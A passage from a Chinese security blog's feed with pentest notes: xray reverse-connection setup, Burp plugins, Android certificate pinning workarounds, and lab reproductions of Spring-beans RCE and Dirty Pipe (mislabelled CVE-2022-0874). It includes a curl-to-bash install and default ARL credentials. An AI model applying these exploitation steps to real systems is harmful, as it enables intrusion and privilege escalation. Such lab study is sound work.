&lt;p&gt;&lt;img src=&#34;https://img2022.cnblogs.com/blog/2520529/202206/2520529-20220616143532153-439053999.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;添加两条A记录。主记录填ns1 ns2，就是刚刚创建的dns服务器，记录值填公网ip：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://img2022.cnblogs.com/blog/2520529/202206/2520529-20220616143724538-1597006301.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;xray服务端配置&#34;&gt;xray服务端配置：&lt;/h2&gt;
&lt;p&gt;下载最新xray。https://github.com/chaitin/xray&lt;/p&gt;
&lt;p&gt;./xray config&lt;/p&gt;
&lt;p&gt;根据下图配置config文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;　reverse:
  db_file_path: &amp;#34;./xxx.db&amp;#34;                      # 反连平台数据库文件位置, 这是一个 KV 数据库
  token: &amp;#34;xxxxx&amp;#34;                             # 和客户端一致。反连平台认证的 Token, 独立部署时不能为空
  http:
    enabled: true
    listen_ip: 0.0.0.0 
    listen_port: &amp;#34;4444&amp;#34;　　　　　　　　　　#和客户端一致
    ip_header: &amp;#34;&amp;#34;                       # 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取
  dns:
    enabled: true
    listen_ip: 0.0.0.0 
    domain: &amp;#34;xxxx.cn&amp;#34;                          # 自己购买域名，最好是阿里云，因为可以自定义dnshost。DNS 域名配置。
    is_domain_name_server: false        # 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了
    resolve:                            # DNS 静态解析规则
    - type: A                           # A, AAAA, TXT 三种
      record: ns2
      value: xx.xx.xx.xx　　　　　　　　　　#自己公网主机ip
      ttl: 60
    - type: A
      record: ns1
      value: 8
　　　 xx.xx.xx.xx　　　　　　　　　　　　　　#自己公网主机ip
　　　 ttl: 60 
  client: 
remote_server: false # 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址 

http_base_url: &amp;#34;http://xx.xx.xx.xx:4444&amp;#34; # 自己公网ip+端口。默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置 
dns_server_ip: &amp;#34;xx.xx.xx.xx&amp;#34; #自己公网ip。 和 http_base_url 类似，实际用来访问 dns 服务器的地址
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;xray客户端配置&#34;&gt;xray客户端配置：&lt;/h2&gt;
&lt;p&gt;xray根目录配置config文件&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;reverse:
db_file_path: &amp;#34;./xxxx.db&amp;#34; # 反连平台数据库文件位置, 这是一个 KV 数据库
token: &amp;#34;xxxxx&amp;#34; # 随便填，自己记住，用于登录可视化界面校验 。反连平台认证的 Token, 独立部署时不能为空。
http:
enabled: false
listen_ip: 0.0.0.0
listen_port: &amp;#34;&amp;#34;
ip_header: &amp;#34;&amp;#34; # 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取
dns:
enabled: false
listen_ip: 0.0.0.0
domain: &amp;#34;&amp;#34; # DNS 域名配置
is_domain_name_server: false # 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了
resolve: # DNS 静态解析规则
- type: A # A, AAAA, TXT 三种
record: localhost
value: 127.0.0.1
ttl: 60
client:
remote_server: true # 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址
http_base_url: &amp;#34;http://xx.xx.xx.xx:4444&amp;#34; # 自己公网ip+端口。默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置
dns_server_ip: &amp;#34;xx.xx.xx.xx&amp;#34; # 自己公网ip。和 http_base_url 类似，实际用来访问 dns 服务器的地址
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;服务端开启&#34;&gt;服务端开启：&lt;/h2&gt;
&lt;p&gt;./xray reverse&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202235807.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;访问web，输入token：&lt;/p&gt;
&lt;h3 id=&#34;测试dns&#34;&gt;测试dns&lt;/h3&gt;
&lt;h4 id=&#34;右边的dns点击生成一个域名&#34;&gt;右边的DNS，点击生成一个域名&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://img2022.cnblogs.com/blog/2520529/202206/2520529-20220616144850460-928180663.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接ping，在dns一栏有记录就没问题。&lt;/p&gt;
&lt;h3 id=&#34;测试http&#34;&gt;测试http&lt;/h3&gt;
&lt;p&gt;右边的http，点击生成一个域名&lt;/p&gt;
&lt;p&gt;curl -v xxxx.xx.cn 　　&lt;/p&gt;
&lt;p&gt;左边http一栏有记录就代表没问题。&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">burp插件</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/burp%E6%8F%92%E4%BB%B6/" />
            <id>https://klearcc.github.io/post/burp%E6%8F%92%E4%BB%B6/</id>
            <updated>2022-10-13T13:44:51&#43;08:00</updated>
            <published>2022-05-24T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">扫描增强插件， 建议所有请求做主动 burp……</summary>
            
                <content type="html">&lt;p&gt;扫描增强插件，
建议所有请求做主动&lt;/p&gt;
&lt;p&gt;burp开启手动配置
xss 开启 phantomjs
xia SQL 开启监控proxy
csrf token tracker 开启同步
log4j2 配置反连
Autorize 打开&lt;/p&gt;
&lt;p&gt;sql
xia SQL，被动扫描，需配置监控proxy
xss
xssVaildator 手动探测，单个url测试。启动phantomjs，请求发送到intruder，设置负载xssvaildator，设置flag
Reflector 被动探测，结果显示在issue
LFI
LFI scanner checks.主动扫描， 内置
csrf
csrf token tracker 被动探测，手动打开同步。绕过CSRF-TOKEN
csrf scanner 被动扫描，但手动发送
ssrf
SSRF-King， 怎么说
burpssrf4， 怎么说
主动扫描
shiro
shiroscan，被动扫描，结果显示shrio标签页
struts2
strust2 被动扫描，结果显示在标签页
fastjson
fastjsonscan，被动扫描，结果显示标签页
log4j2
log4j2 RCE，被动扫描，需配置ceye，结果显示标签页+issue
反序列化汇总
Desericalization 被动主动都有，标签页手动测试，结果显示issus。
越权
Authz 手动探测，可以批量，自己设置cookie，对比返回包数据。
Authorize 被动探测，手动打开插件，先搞一个低权限cookie，再登录高权限账号点一遍。
可以着重先看橘黄色请求，
敏感信息&lt;/p&gt;
&lt;p&gt;收集信息
DomainHunter
小工具
Knife 方便过滤domain等
software vulnerability scanner 显示cve ，使用取消scope勾选
Country Free 定制payload
passive scan client 监听&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">记录：使用alias安装三版本jdk环境</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E5%A4%9Ajava%E7%8E%AF%E5%A2%83/" />
            <id>https://klearcc.github.io/post/%E5%A4%9Ajava%E7%8E%AF%E5%A2%83/</id>
            <updated>2022-09-20T22:32:05&#43;08:00</updated>
            <published>2022-05-19T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">起因：正常使用zulu的jdk，因为它针……</summary>
            
                <content type="html">&lt;p&gt;起因：正常使用zulu的jdk，因为它针对m1优化，速度快。&lt;/p&gt;
&lt;p&gt;后果：默认zulujdk无法打开其他师傅的工具。&lt;/p&gt;
&lt;p&gt;同时安装1.8 zulu1.8 zulu15&lt;/p&gt;
&lt;p&gt;查看安装的jdk&lt;/p&gt;
&lt;p&gt;ls /Library/Java/JavaVirtualMachines&lt;/p&gt;
&lt;p&gt;~/.zshrc：&lt;/p&gt;
&lt;p&gt;#java
# 设置jdk8
export JAVA_8_HOME=&amp;quot;$(/usr/libexec/java_home -v 1.8)&amp;quot;
#设置zulu1.8
export JAVA_88_HOME=&amp;quot;/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home&amp;quot;
# 设置zulu15
export JAVA_15_HOME=&amp;quot;$(/usr/libexec/java_home -v 15)&amp;quot;
# alias命令动态切换jdk版本
alias jdk8=&#39;export JAVA_HOME=$JAVA_8_HOME&#39;
alias jdk15=&#39;export JAVA_HOME=$JAVA_15_HOME&#39;
alias jdk7=&amp;quot;export JAVA_HOME=$JAVA_7_HOME&amp;quot;
# 默认jdk为jdk8
export JAVA_HOME=$JAVA_88_HOME&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">解决burp&#43;夜神 抓https包报错证书有问题</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E5%A4%9C%E7%A5%9E%E6%8A%93%E5%8C%85/" />
            <id>https://klearcc.github.io/post/%E5%A4%9C%E7%A5%9E%E6%8A%93%E5%8C%85/</id>
            <updated>2022-10-13T13:43:57&#43;08:00</updated>
            <published>2022-03-31T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">原理 安卓高版本（7.0）之后，app可以……</summary>
            
                <content type="html">&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;安卓高版本（7.0）之后，app可以只信任指定证书和系统内置的证书，后续用户安装的证书是不生效的，只能想办法装到系统内部。&lt;/p&gt;
&lt;h3 id=&#34;操作&#34;&gt;操作：&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;先配置代理环境，将代理换成物理机ip+burp端口&lt;/li&gt;
&lt;li&gt;导出burp der证书，转换成pem格式，linux执行&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 转为pem格式
openssl x509 -inform DER -in cacert.der -out cacert.pem
# 重命名为&amp;lt;hash值&amp;gt;.0
mv cacert.pem `openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1`&amp;#39;.0&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;将.0文件copy到当前目录，使用模拟器自带abd操作&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;adb root
adb remount
adb push 9a5ba575.0 /system/etc/security/cacerts
adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
&lt;/code&gt;&lt;/pre&gt;</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E6%BC%8F%E6%B4%9E/" term="漏洞" label="漏洞" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Spring-beans RCE漏洞复现</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/spring-beansrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
            <id>https://klearcc.github.io/post/spring-beansrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
            <updated>2022-09-20T22:30:10&#43;08:00</updated>
            <published>2022-03-25T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">环境 docker pull vulfocus/spring-core-rce-2022-03-29 路径 漏洞利用 发包 添加自定义请求……</summary>
            
                <content type="html">&lt;p&gt;环境&lt;/p&gt;
&lt;p&gt;docker pull vulfocus/spring-core-rce-2022-03-29&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://img2022.cnblogs.com/blog/2520529/202203/2520529-20220331164623262-1882598796.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202229829.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202229041.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;漏洞利用&lt;/p&gt;
&lt;p&gt;发包&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://img2022.cnblogs.com/blog/2520529/202203/2520529-20220331185143573-1156304397.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;添加自定义请求头发包&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202229298.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功写入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202229611.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;bash反弹shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://img2022.cnblogs.com/blog/2520529/202203/2520529-20220331185715318-1101453209.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;url编码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202229066.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;访问，收到shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202229514.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Dirty Pipe(CVE-2022-0874)漏洞复现</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/dirtypipecve-2022-0874%E5%A4%8D%E7%8E%B0/" />
            <id>https://klearcc.github.io/post/dirtypipecve-2022-0874%E5%A4%8D%E7%8E%B0/</id>
            <updated>2022-09-20T22:25:45&#43;08:00</updated>
            <published>2022-03-09T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">漏洞简介 Dirty Pipe(CVE-2022-0……</summary>
            
                <content type="html">&lt;h3 id=&#34;漏洞简介&#34;&gt;&lt;strong&gt;漏洞简介&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Dirty Pipe(CVE-2022-0874)，比脏牛利用简单，提权方便。&lt;/p&gt;
&lt;h3 id=&#34;影响范围&#34;&gt;影响范围：&lt;/h3&gt;
&lt;p&gt;5.8&amp;lt;=Linux kernel&amp;lt;5.16.11/5.15.25/5.10.102&lt;/p&gt;
&lt;h3 id=&#34;漏洞环境搭建&#34;&gt;&lt;strong&gt;漏洞环境搭建：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;当前内核版本：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202222145.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;漏洞内核下载：https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8.5/&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202222418.png&#34; alt=&#34;img&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202223960.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装内核： &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202223725.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;更新启动引导程序：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202223381.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;重启：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202223143.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装gcc： &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202224329.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;创建新用户并切换至低权限用户：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202224516.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用&#34;&gt;&lt;strong&gt;漏洞利用&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;下载exp： &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202224206.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202224295.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;-----------------------------------------------------------------------------------------------------&lt;/p&gt;
&lt;p&gt;参考链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://haxx.in/files/dirtypipez.c&#34;&gt;https://haxx.in/files/dirtypipez.c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8.5/&#34;&gt;https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8.5/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit&#34;&gt;https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;漏洞分析：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://dirtypipe.cm4all.com/&#34;&gt;https://dirtypipe.cm4all.com/&lt;/a&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E6%BC%8F%E6%B4%9E/" term="漏洞" label="漏洞" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text"></title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/google/" />
            <id>https://klearcc.github.io/post/google/</id>
            <updated>2022-11-14T10:27:02&#43;08:00</updated>
            <published>0001-01-01T00:00:00&#43;00:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">f防火墙 防火墙规则 入站出站allow docker curl……</summary>
            
                <content type="html">&lt;h2 id=&#34;f防火墙&#34;&gt;f防火墙&lt;/h2&gt;
&lt;p&gt;防火墙规则 入站出站allow&lt;/p&gt;
&lt;h2 id=&#34;docker&#34;&gt;docker&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
yum install docker-compose
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;墙&#34;&gt;墙&lt;/h2&gt;
&lt;p&gt;systemctl stop firewalld
systemctl restart docker&lt;/p&gt;
&lt;h2 id=&#34;arl&#34;&gt;arl&lt;/h2&gt;
&lt;p&gt;git clone &lt;a href=&#34;https://github.com/TophantTechnology/ARL&#34;&gt;https://github.com/TophantTechnology/ARL&lt;/a&gt;
cd ARL/docker/
docker volume create arl_db
docker-compose pull
docker-compose up -d&lt;/p&gt;
&lt;p&gt;默认端口5003 (https), 默认用户名密码admin/arlpass&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text"></title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/ios%E9%80%86%E5%90%91/" />
            <id>https://klearcc.github.io/post/ios%E9%80%86%E5%90%91/</id>
            <updated>2022-12-27T18:26:30&#43;08:00</updated>
            <published>0001-01-01T00:00:00&#43;00:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">One 数据存取 cpu先将数据存储到低32位寄……</summary>
            
                <content type="html">&lt;h2 id=&#34;one&#34;&gt;One&lt;/h2&gt;
&lt;h5 id=&#34;数据存取&#34;&gt;数据存取&lt;/h5&gt;
&lt;p&gt;cpu先将数据存储到低32位寄存器	x0-x28 fp lr sp&lt;/p&gt;
&lt;h5 id=&#34;pc寄存器&#34;&gt;pc寄存器&lt;/h5&gt;
&lt;p&gt;指向 当前要执行的指令&lt;/p&gt;
&lt;h5 id=&#34;sp寄存器&#34;&gt;SP寄存器&lt;/h5&gt;
&lt;p&gt;Arm64位寄存器占8个字节&lt;/p&gt;
&lt;p&gt;栈：程序从内存中开辟空间时 从高地址往低地址开辟。
堆：从低地址向高地址开辟&lt;/p&gt;
&lt;p&gt;在哪里 那里就是栈。32位POP PUSH已经取消了
读/写数据都是往高地址读写	
str 将数据从寄存器读出来，写到内存中
Stp 可以操作两个寄存器
ldr 相反&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;.text
.global _A
_A:
    sub sp,sp,#20;  //sp寄存器的内存地址减32
    stp x0,x1,[sp,#0x10]；   //将x0 x1寄存器的值 存到 sp地址+0x10的 内存区域。arm64 一个寄存器占8个字节
    ldp x1,x0,[sp,#0x10];   //将位于sp地址+0x10 的内存区域的值，存到x1 x0寄存器内
    add sp,sp,#20;  //复位
    ret
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;fp寄存器&#34;&gt;FP寄存器&lt;/h5&gt;
&lt;p&gt;很少用&lt;/p&gt;
&lt;h5 id=&#34;bl和ret&#34;&gt;bl和ret&lt;/h5&gt;
&lt;p&gt;bl
将下一条指令的地址放到lr(x30)寄存器  即：返回地址
转到福好处执行指令&lt;/p&gt;
&lt;p&gt;ret
跳转到lr(x30)地址 的地方&lt;/p&gt;
&lt;h5 id=&#34;函数的参数和局部变量&#34;&gt;函数的参数和局部变量&lt;/h5&gt;
&lt;p&gt;叶子函数不用开辟栈空间
arm64下，函数的参数存放在x0-x7中，如果参数个数超过8就要入栈。
函数的返回值是放在x0寄存器内&lt;/p&gt;
&lt;h5 id=&#34;标记寄存器&#34;&gt;标记寄存器&lt;/h5&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text"></title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/javasec_struts2/" />
            <id>https://klearcc.github.io/post/javasec_struts2/</id>
            <updated>2022-10-20T17:13:50&#43;08:00</updated>
            <published>0001-01-01T00:00:00&#43;00:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html"></summary>
            
                <content type="html"></content>
            
            
            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text"></title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/xwin%E4%BF%A1%E6%81%AF/" />
            <id>https://klearcc.github.io/post/xwin%E4%BF%A1%E6%81%AF/</id>
            <updated>2023-01-08T14:53:02&#43;08:00</updated>
            <published>0001-01-01T00:00:00&#43;00:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html"></summary>
            
                <content type="html"></content>
            
            
            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text"></title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/x%E5%86%85%E5%AD%98%E9%A9%AC/" />
            <id>https://klearcc.github.io/post/x%E5%86%85%E5%AD%98%E9%A9%AC/</id>
            <updated>2023-01-06T12:25:30&#43;08:00</updated>
            <published>0001-01-01T00:00:00&#43;00:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">扫盲 分类 • 动态注册servlet/fil……</summary>
            
                <content type="html">&lt;h1 id=&#34;扫盲&#34;&gt;扫盲&lt;/h1&gt;
&lt;h2 id=&#34;分类&#34;&gt;分类&lt;/h2&gt;
&lt;p&gt;• 动态注册servlet/filter/listener（使用 servlet-api 的具体实现）&lt;/p&gt;
&lt;p&gt;• 动态注册interceptor/controller（使用框架如 spring/struts2）&lt;/p&gt;
&lt;p&gt;• 动态注册使用职责链设计模式的中间件、框架的实现（例如 Tomcat的Pipeline&amp;amp;Valve，Grizzly的FilterChain&amp;amp;Filter等等）&lt;/p&gt;
&lt;p&gt;• 使用java agent技术写入字节码&lt;/p&gt;
&lt;h2 id=&#34;类-变量-作用&#34;&gt;类 变量 作用&lt;/h2&gt;
&lt;p&gt;FilterMaps： FilterMaps中的&lt;code&gt;FilterMap&lt;/code&gt;则记录了不同filter与&lt;code&gt;UrlPattern&lt;/code&gt;的映射关系&lt;/p&gt;
&lt;p&gt;FilterDefs：FilterDefs成员变量是一个HashMap对象，存储了filter名称与相应&lt;code&gt;FilterDef&lt;/code&gt;的对象的键值对，而&lt;code&gt;FilterDef&lt;/code&gt;对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据&lt;/p&gt;
&lt;p&gt;FilterConfigs：是一个HashMap对象，里面存储了filter名称与对应的&lt;code&gt;ApplicationFilterConfig&lt;/code&gt;对象的键值对，在&lt;code&gt;ApplicationFilterConfig&lt;/code&gt;对象中则存储了Filter实例以及该实例在web.xml中的注册信息。&lt;/p&gt;
&lt;p&gt;FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter&lt;/p&gt;
&lt;p&gt;ApplicationFilterChain：调用过滤器链&lt;/p&gt;
&lt;p&gt;ApplicationFilterConfig：获取过滤器&lt;/p&gt;
&lt;p&gt;ApplicationFilterFactory：组装过滤器链&lt;/p&gt;
&lt;p&gt;WebXml：存放 web.xml 中内容的类&lt;/p&gt;
&lt;p&gt;ContextConfig：Web应用的上下文配置类&lt;/p&gt;
&lt;p&gt;StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper&lt;/p&gt;
&lt;p&gt;StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                
            
        </entry>
    
</feed>
